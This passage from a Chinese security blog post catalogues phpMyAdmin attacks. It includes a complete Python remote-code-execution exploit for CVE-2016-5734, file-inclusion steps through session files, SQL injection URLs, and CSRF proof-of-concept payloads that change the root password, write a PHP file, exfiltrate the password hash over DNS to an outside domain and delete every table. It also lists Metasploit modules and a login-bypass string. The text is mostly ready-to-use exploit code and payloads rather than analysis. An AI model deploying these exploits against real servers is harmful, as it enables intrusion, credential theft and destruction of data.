class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit</span></span><br><span class="line"><span class="string">Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.</span></span><br><span class="line"><span class="string">CVE: CVE-2016-5734</span></span><br><span class="line"><span class="string">Author: https://twitter.com/iamsecurity</span></span><br><span class="line"><span class="string">run: ./cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system(&#x27;ls -lua&#x27;);&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;@iamsecurity&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;URL with path to PMA&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;PHP command(s) to eval()&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--user&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--pwd&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Password for valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-d&quot;</span>, <span class="string">&quot;--dbs&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Existing database at a server&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-T&quot;</span>, <span class="string">&quot;--table&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Custom table name for exploit.&quot;</span>)</span><br><span class="line">    arguments = parser.parse_args()</span><br><span class="line">    url_to_pma = arguments.url</span><br><span class="line">    uname = arguments.user</span><br><span class="line">    upass = arguments.pwd</span><br><span class="line">    <span class="keyword">if</span> arguments.dbs:</span><br><span class="line">        db = arguments.dbs</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        db = <span class="string">&quot;test&quot;</span></span><br><span class="line">    token = <span class="literal">False</span></span><br><span class="line">    custom_table = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> arguments.table:</span><br><span class="line">        custom_table = <span class="literal">True</span></span><br><span class="line">        table = arguments.table</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table = <span class="string">&quot;prgpwn&quot;</span></span><br><span class="line">    <span class="keyword">if</span> arguments.cmd:</span><br><span class="line">        payload = arguments.cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">&quot;system(&#x27;uname -a&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line">    size = <span class="number">32</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    <span class="comment"># you can manually add proxy support it&#x27;s very simple ;)</span></span><br><span class="line">    <span class="comment"># s.proxies = &#123;&#x27;http&#x27;: &quot;127.0.0.1:8080&quot;, &#x27;https&#x27;: &quot;127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">    s.verify = <span class="literal">False</span></span><br><span class="line">    sql = <span class="string">&#x27;&#x27;&#x27;CREATE TABLE `&#123;0&#125;` (</span></span><br><span class="line"><span class="string">      `first` varchar(10) CHARACTER SET utf8 NOT NULL</span></span><br><span class="line"><span class="string">    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span></span><br><span class="line"><span class="string">    INSERT INTO `&#123;0&#125;` (`first`) VALUES (UNHEX(&#x27;302F6500&#x27;));</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(table)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get_token</span></span><br><span class="line">    resp = s.post(url_to_pma + <span class="string">&quot;/?lang=en&quot;</span>, <span class="built_in">dict</span>(</span><br><span class="line">        pma_username=uname,</span><br><span class="line">        pma_password=upass</span><br><span class="line">    ))</span><br><span class="line">    <span class="keyword">if</span> resp.status_code <span class="keyword">is</span> <span class="number">200</span>:</span><br><span class="line">        token_place = resp.text.find(<span class="string">&quot;token=&quot;</span>) + <span class="number">6</span></span><br><span class="line">        token = resp.text[token_place:token_place + <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Cannot get valid authorization token.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> custom_table <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;is_js_confirmed&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">            <span class="string">&quot;pos&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sql_query&quot;</span>: sql,</span><br><span class="line">            <span class="string">&quot;sql_delimiter&quot;</span>: <span class="string">&quot;;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;show_query&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;fk_checks&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SQL&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ajax_page_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        resp = s.post(url_to_pma + <span class="string">&quot;/import.php&quot;</span>, data, cookies=requests.utils.dict_from_cookiejar(s.cookies))</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> resp.json():</span><br><span class="line">                <span class="keyword">if</span> resp.json()[<span class="string">&quot;success&quot;</span>] <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">                    first = resp.json()[<span class="string">&quot;error&quot;</span>][resp.json()[<span class="string">&quot;error&quot;</span>].find(<span class="string">&quot;&lt;code&gt;&quot;</span>)+<span class="number">6</span>:]</span><br><span class="line">                    error = first[:first.find(<span class="string">&quot;&lt;/code&gt;&quot;</span>)]</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;already exists&quot;</span> <span class="keyword">in</span> error:</span><br><span class="line">                        <span class="built_in">print</span>(error)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;ERROR: &quot;</span> + error)</span><br><span class="line">                        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># build exploit</span></span><br><span class="line">    exploit = &#123;</span><br><span class="line">        <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">        <span class="string">&quot;table&quot;</span>: table,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">        <span class="string">&quot;goto&quot;</span>: <span class="string">&quot;sql.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;find&quot;</span>: <span class="string">&quot;0/e\0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;replaceWith&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;columnIndex&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;useRegex&quot;</span>: <span class="string">&quot;on&quot;</span>,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = s.post(</span><br><span class="line">        url_to_pma + <span class="string">&quot;/tbl_find_replace.php&quot;</span>, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        result = resp.json()[<span class="string">&quot;message&quot;</span>][resp.json()[<span class="string">&quot;message&quot;</span>].find(<span class="string">&quot;&lt;/a&gt;&quot;</span>)+<span class="number">8</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span> + result)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;Exploit failed!\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Try to manually set exploit parameters like --table, --database and --token.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Remember that servers with PHP version greater than 5.4.6&quot;</span></span><br><span class="line">            <span class="string">&quot; is not exploitable, because of warning about null byte in regexp&quot;</span></span><br><span class="line">        )</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>利用如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cve-2016-5734.py -u root --<span class="built_in">pwd</span>=<span class="string">&quot;&quot;</span> http://localhost/pma -c <span class="string">&quot;system(&#x27;ls -lua&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="3-4-CVE-2018-12613：后台文件包含"><a href="#3-4-CVE-2018-12613：后台文件包含" class="headerlink" title="3.4 CVE-2018-12613：后台文件包含"></a>3.4 CVE-2018-12613：后台文件包含</h2><p>影响范围：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">	4.8.0和4.8.1</span></span><br></pre></td></tr></table></figure>

<p>利用如下：<br>（1）执行SQL语句，将PHP代码写入Session文件中：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="keyword">exit</span>;<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>（2）包含session文件：(注意这里是默认了根目录是 <code>网站/phpmyadmin/</code>)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.1.1.10/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_*** 		</span><br><span class="line"><span class="comment"># *** 为phpMyAdmin的COOKIE值</span></span><br></pre></td></tr></table></figure>



<h2 id="3-5-CVE-2018-19968：任意文件包含-x2F-RCE"><a href="#3-5-CVE-2018-19968：任意文件包含-x2F-RCE" class="headerlink" title="3.5 CVE-2018-19968：任意文件包含&#x2F;RCE"></a>3.5 CVE-2018-19968：任意文件包含&#x2F;RCE</h2><p>影响范围：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">	4.8.0~4.8.3</span></span><br></pre></td></tr></table></figure>

<p>利用如下：<br>（1）创建数据库，并将PHP代码写入Session文件中</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">CREATE DATABASE foo;CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );INSERT INTO foo.bar SELECT &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><span class="language-xml">&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>（2）生成foo数据库的phpMyAdmin的配置表，访问：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.1.1.10/chk_rel.php?fixall_pmadb=1&amp;db=foo</span><br></pre></td></tr></table></figure>

<p>（3）篡改数据插入pma column_info中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span>` pma__column_infoSELECT <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;baz&#x27;</span>, <span class="string">&#x27;plop&#x27;</span>,<span class="string">&#x27;plop&#x27;</span>, <span class="string">&#x27; plop&#x27;</span>, <span class="string">&#x27;plop&#x27;</span>,<span class="string">&#x27;../../../../../../../../tmp/sess_***&#x27;</span>,<span class="string">&#x27;plop&#x27;</span>; # <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> 为phpMyAdmin 的COOKIE值</span><br></pre></td></tr></table></figure>

<p>这里要注意不用系统的session保存位置不同，具体系统可以在phpMyAdmin登录后首页看到</p>
<p>MacOS：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/tmp</span><br></pre></td></tr></table></figure>

<p>Linux：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sessions</span><br></pre></td></tr></table></figure>

<p>phpStudy：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpstudy/PHPTutorial/tmp/tmp</span><br></pre></td></tr></table></figure>

<p>（4）访问包含Session文件的地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.1.1.10/tbl_replace.php?db=foo&amp;table=bar&amp;where_clause=1=1&amp;fields_name[ multi_edit][][]=baz&amp;clause_is_unique=1</span><br></pre></td></tr></table></figure>



<h2 id="3-6-CVE-2020-0554：后台SQL注入"><a href="#3-6-CVE-2020-0554：后台SQL注入" class="headerlink" title="3.6 CVE-2020-0554：后台SQL注入"></a>3.6 CVE-2020-0554：后台SQL注入</h2><p>影响范围：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">	phpMyAdmin 4&lt; 4.9.4</span></span><br><span class="line"><span class="code">	phpMyAdmin 5&lt; 5.0.1</span></span><br><span class="line"><span class="code">	前提：已知一个用户名密码</span></span><br></pre></td></tr></table></figure>

<p>简单总结流程：</p>
<p>页面位置<code>server_privileges.php</code>；</p>
<p>设置变量<code>ajax_requests为true</code>；</p>
<p>设置变量<code>validate_username</code> 为真值；</p>
<p>设置变量<code>username</code> 为我们拼接的注入语句。</p>
<p>构造payload：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//192.168.209.139:8001/server_privileges.php?ajax_requests=true&amp;validate_username=1&amp;username=1%27or%201=1%20--+db=&amp;token=c2064a8c5f437da931fa01de5aec6581&amp;viewing_mode=server</span></span><br></pre></td></tr></table></figure>

<p>（token和其余参数会在访问页面的时候自动提供）</p>
<p>我们查看后端收到的数据，可以看到SQL已经成功拼接。</p>
<p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153855019-226491722.png" alt="img"></p>
<p>执行完毕后程序只会告知SQL是否执行成功，失败会报错，因此此处我们可以利用报错注入。</p>
<p>构造payload：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//192.168.209.139:8001/server_privileges.php?ajax_request=true&amp;validate_username=1&amp;username=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+db=&amp;token=c2064a8c5f437da931fa01de5aec6581&amp;viewing_mode=server</span></span><br></pre></td></tr></table></figure>

<p>结果如下，可以看到已经成功执行了我们注入的指令。</p>
<p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153902353-723535547.png" alt="img"></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1599837">CVE-2020-0554：phpMyAdmin后台SQL注入</a></p>
<h2 id="3-7-CVE-2019-12922-跨站请求伪造"><a href="#3-7-CVE-2019-12922-跨站请求伪造" class="headerlink" title="3.7 CVE-2019-12922 跨站请求伪造"></a>3.7 CVE-2019-12922 跨站请求伪造</h2><p>影响范围：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">	&lt;= 4.9.0.1</span></span><br></pre></td></tr></table></figure>

<p>利用如下：</p>
<p>在登录状态下，添加一个服务器</p>
<p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153909869-1655502862.png" alt="img"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//192.168.123.65/phpmyadmin/setup/index.php</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153916720-959046693.png" alt="img"></p>
<p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153924147-810378326.png" alt="img"></p>
<p>点击删除时，通过工具抓包</p>
<p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153933405-797280621.png" alt="img"></p>
<p>参数id对应的是第几个服务器。构造恶意链接。</p>
<p>当然实战中的链接怎么吸引人让目标去点击还得靠自己去构造。</p>
<p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153938652-2011200675.png" alt="img"></p>
<p>页面显示404，但img的src会去请求一次。此时创建了两个服务器</p>
<p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153942587-1621023840.png" alt="img"></p>
<p>点击我们构造的恶意链接时，显示刚才构造的页面结果</p>
<p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153947778-376804677.png" alt="img"></p>
<p>此时再去查看服务器</p>
<p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153951834-327482848.png" alt="img"></p>
<p>已经被删除，攻击成功。</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1517920">CVE-2019-12922 phpMyAdmin 4.9.0.1-跨站请求伪造漏洞复现</a></p>
<h2 id="3-8-CVE-2017-1000499-跨站请求伪造"><a href="#3-8-CVE-2017-1000499-跨站请求伪造" class="headerlink" title="3.8 CVE-2017-1000499 跨站请求伪造"></a>3.8 CVE-2017-1000499 跨站请求伪造</h2><p>影响范围：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line">	<span class="symbol">Phpmyadmin:</span><span class="number">4.7</span>.<span class="number">6</span>  </span><br><span class="line">	<span class="symbol">Phpmyadmin:</span><span class="number">4.7</span>.<span class="number">0</span><span class="symbol">:Beta1</span>  </span><br><span class="line">	<span class="symbol">Phpmyadmin:</span><span class="number">4.7</span>.<span class="number">0</span><span class="symbol">:Rc1</span>  </span><br><span class="line">	<span class="symbol">Phpmyadmin:</span><span class="number">4.7</span>.<span class="number">5</span>  </span><br><span class="line">	<span class="symbol">Phpmyadmin:</span><span class="number">4.7</span>.<span class="number">4</span>  </span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: phpMyAdmin 4.7.x - Cross-Site Request Forgery</span></span><br><span class="line"><span class="comment"># Date: 2018-08-28</span></span><br><span class="line"><span class="comment"># Exploit Author: VulnSpy</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://www.phpmyadmin.net/</span></span><br><span class="line"><span class="comment"># Software Link: https://www.phpmyadmin.net/downloads/</span></span><br><span class="line"><span class="comment"># Version: Versions 4.7.x (prior to 4.7.7)</span></span><br><span class="line"><span class="comment"># Tested on: php7 mysql5</span></span><br><span class="line"><span class="comment"># CVE: CVE-2017-1000499</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit CSRF - Modifying the password of current user</span></span><br><span class="line"></span><br><span class="line">&lt;p&gt;Hello World&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src=&quot;</span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/7f366ec1afc5832757a402b5355132d0.vsplate.me/s</span>ql.php?db=mysql&amp;table=user&amp;sql_query=SET%20password</span><br><span class="line">%20=%20PASSWORD(%27www.vulnspy.com%27)<span class="string">&quot; style=&quot;</span>display:none;<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Exploit CSRF - Arbitrary File Write</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p&gt;Hello World&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;img src=&quot;</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">7</span>f366ec1afc5832757a402b5355132d<span class="number">0</span>.vsplate.me/sql.php?db=mysql&amp;table=user&amp;sql_query=<span class="keyword">select</span></span><br><span class="line"><span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/test.php&#x27;</span>;<span class="string">&quot;</span></span><br><span class="line"><span class="string">style=&quot;</span>display:none;<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Exploit CSRF - Data Retrieval over DNS</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(SELECT password FROM mysql.user WHERE</span></span><br><span class="line"><span class="string">user=&#x27;root&#x27; LIMIT 1),&#x27;.vulnspy.com\\test&#x27;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Exploit CSRF - Empty All Rows From All Tables</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p&gt;Hello World&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;img src=&quot;</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">7</span>f366ec1afc5832757a402b5355132d<span class="number">0</span>.vsplate.me/import.php?db=mysql&amp;table=user&amp;sql_query=DROP+PROCEDURE+IF+EXISTS+EMPT%<span class="number">3</span>B%0ADELIMITER+%24%24%0A++++CREATE+PROCEDURE+EMPT%28%29%0A++++BEGIN%0A++++++++DECLARE+i+INT%<span class="number">3</span>B%0A++++++++SET+i+%3D+<span class="number">0</span>%<span class="number">3</span>B%0A++++++++WHILE+i+%3C+<span class="number">100</span>+DO%0A++++++++++++SET+%40del+%3D+%28SELECT+CONCAT%28%27DELETE+FROM+%27%2CTABLE_SCHEMA%<span class="number">2</span>C%27.%27%2CTABLE_NAME%29+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+LIKE+%27%25_schema%27+<span class="keyword">and</span>+TABLE_SCHEMA%21%<span class="number">3</span>D%27mysql%27+LIMIT+i%2C1%29%<span class="number">3</span>B%0A++++++++++++PREPARE+STMT+FROM+%40del%<span class="number">3</span>B%0A++++++++++++EXECUTE+stmt%<span class="number">3</span>B%0A++++++++++++SET+i+%3D+i+%2B1%<span class="number">3</span>B%0A++++++++END+WHILE%<span class="number">3</span>B%0A++++END+%24%24%0ADELIMITER+%<span class="number">3</span>B%0A%0ACALL+EMPT%28%29%<span class="number">3</span>B%0A<span class="string">&quot;</span></span><br><span class="line"><span class="string">style=&quot;</span>display:none;<span class="string">&quot; /&gt;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000499">CVE-2017-1000499</a></p>
<h1 id="4特殊版本GetShell"><a href="#4特殊版本GetShell" class="headerlink" title="4特殊版本GetShell"></a>4特殊版本GetShell</h1><h2 id="4-1-CVE-2013-3238"><a href="#4-1-CVE-2013-3238" class="headerlink" title="4.1 CVE-2013-3238"></a>4.1 CVE-2013-3238</h2><blockquote>
<p> 影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG</p>
<p> 利用模块：exploit&#x2F;multi&#x2F;http&#x2F;phpmyadminpregreplace</p>
</blockquote>
<h2 id="4-2-CVE-2012-5159"><a href="#4-2-CVE-2012-5159" class="headerlink" title="4.2 CVE-2012-5159"></a>4.2 CVE-2012-5159</h2><blockquote>
<p> 影响版本：phpMyAdmin v3.5.2.2</p>
<p> 利用模块：exploit&#x2F;multi&#x2F;http&#x2F;phpmyadmin3522_backdoor</p>
</blockquote>
<h2 id="4-3-CVE-2009-1151"><a href="#4-3-CVE-2009-1151" class="headerlink" title="4.3 CVE-2009-1151"></a>4.3 CVE-2009-1151</h2><blockquote>
<p> PhpMyAdmin配置文件&#x2F;config&#x2F;config.inc.php存在命令执行</p>
<p> 影响版本：2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1</p>
<p> 利用模块：exploit&#x2F;unix&#x2F;webapp&#x2F;phpmyadmin_config</p>
</blockquote>
<h2 id="4-4-弱口令-amp-万能密码"><a href="#4-4-弱口令-amp-万能密码" class="headerlink" title="4.4 弱口令&amp;万能密码"></a>4.4 弱口令&amp;万能密码</h2><blockquote>
<p> 弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码</p>
<p> 万能密码：版本2.11.3 &#x2F; 2.11.4，用户名‘localhost‘@‘@”则登录成功</p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://gswanx.github.io">1ustinianus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://gswanx.github.io/post/a458c677.html">http://gswanx.github.io/post/a458c677.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://gswanx.github.io" target="_blank">逃    避    現    實</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-Web/">CTF-Web</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a></div><div class="post_share"><div class="social-share" data-image="/img/headddd.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a 